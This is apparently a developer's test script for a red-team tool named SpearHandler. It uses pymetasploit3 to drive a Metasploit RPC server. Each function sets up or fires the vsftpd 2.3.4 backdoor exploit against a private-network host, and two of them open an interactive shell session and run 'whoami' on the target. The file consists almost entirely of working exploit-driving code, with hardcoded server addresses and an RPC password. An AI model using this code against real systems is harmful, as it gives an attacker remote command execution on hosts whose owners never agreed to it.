import sys

# setting path
sys.path.append('../SpearHandler')

from pymetasploit3.msfrpc import *
from Operations.MetasploitShell import *
from Operations.Operation import *

def main():
    client = MsfRpcClient('test', port=55552, server="192.168.254.95")
    print(client.modules.evasion)
    print(client.modules.search("vsftpd"))
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    print(exploit.options)
    print(exploit.missing_required)
    exploit['RHOSTS'] = '192.168.13.28'
    output = exploit.execute(payload='cmd/unix/interact')
    print(output)
    print(client.sessions.list)
    shell = client.sessions.session('1')
    shell.write('whoami')
    print(shell.read())

def main2():
    server = MetasploitC2("192.168.254.95", "test")
    exploit = server.metasploitServer.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit['RHOSTS'] = '192.168.13.28'
    output = exploit.execute(payload='cmd/unix/interact')
    print(server.metasploitServer.jobs.list)
    print(server.metasploitServer.sessions.list)
    debug3 = server.metasploitServer.jobs.info_by_uuid(output['uuid'])
    debug4 = server.metasploitServer.jobs.info(output['uuid'])
    print(output)
    client = server.getLatestSession()
    print(client.executeShell("whoami"))
    debug1 = server.metasploitServer.jobs
    debug2 = server.metasploitServer.sessions.list
    debug3 = server.metasploitServer.jobs.info_by_uuid(output['uuid'])
    debug4 = server.metasploitServer.jobs.info(output['uuid'])
    print('a')

import time

def main3():
    testOperation = Operation()
    server = MetasploitC2("192.168.254.95", "test")

    startTime = time.time()
    server.loadExploitAttacksFromServer(testOperation)
    endTime = time.time()
    print(testOperation.attackLibrary)
    print("Time elapsed: %s" % (endTime-startTime))

def main4():
    server = MetasploitC2("192.168.254.95", "test")
    exploit = server.metasploitServer.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit['RHOSTS'] = '192.168.13.28'
    print(exploit.info)

main4()